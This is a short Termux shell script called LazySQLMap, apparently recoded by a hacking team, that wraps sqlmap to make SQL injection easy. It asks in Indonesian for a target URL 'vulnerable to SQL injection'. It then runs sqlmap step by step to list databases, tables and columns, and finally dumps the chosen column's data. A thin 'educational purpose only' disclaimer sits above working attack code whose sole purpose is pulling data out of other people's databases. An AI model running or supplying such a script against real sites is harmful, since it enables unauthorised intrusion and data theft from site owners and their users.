#!/data/data/com.termux/files/usr/bin/lazysqlmap
# LazySQLMap
#
# This Tool Designed For Lazy Way To Pentest :)
# Remember Educational Purpose only Not For Crime
# Im Not Responsible If Something Bad Thing Happen
# Use At Your Own Risk
#
# Coded by : Yukinoshita 47 | Garuda Security Hacker
# More Info : http://www.garudasecurityhacker.org
#
#

# START

# Header 
echo "  _    _  _            ____   ___  _ " |lolcat
echo " | |  | || | _____   _/ ___| / _ \| |" |lolcat
echo " | |  | || ||_  / | | \___ \| | | | |" |lolcat
echo " | |__|__   _/ /| |_| |___) | |_| | |___" |lolcat
echo " |_____| |_|/___|\__, |____/ \__\_\_____|" |lolcat
echo "                  |___/" |lolcat
echo "                          \033[91m"
echo "    Mari Jadikan Eksploitasi Anda Happy dan Bersenang-senanglah!!!"
echo "\033[0m"
echo "\033[92m    ==[ Tools Name : LazySQLMap"
echo "    ==[ ReCoded by : Mr.¿?"
echo "    ==[ Team       : X-Core." 
echo "    ==[ What's App : 082333507125"
echo "    ==[ Thank's To : All Member X-Core.\033[0m"

# Select Target

echo "\033[93m"
echo " Masukkan Target Rentan SQL Injeksi Anda Di Bawah Ini" 
echo ""
echo " Contoh : http://site.com/index.php?id=1"
echo ""
echo " Jika kamu ingin menghentikan cukup ketik CTRL + C "
echo "\033[0m" 
echo -n " \033[96mMr.¿? - LazySQLMap\033[0m >> \033[92m"
read TARGET
python2 sqlmap.py -u $TARGET --dbs

# Select Database

echo " Select Database For Table Injection" 
echo "" 
echo " GSH_LazySQLMap >>"
read DATABASE
python2 sqlmap.py -u $TARGET -D $DATABASE --table

# Select Table

echo " Select Table For Column Injection" 
echo "" 
echo " Termux-LazySQLMap >>"
read TABLE
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE --column

# Select Columns

echo " Select Column For Database Dump" 
echo "" 
echo " Termux-LazySQLMap >>"
read COLUMN
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE -C $COLUMN --dump

# END
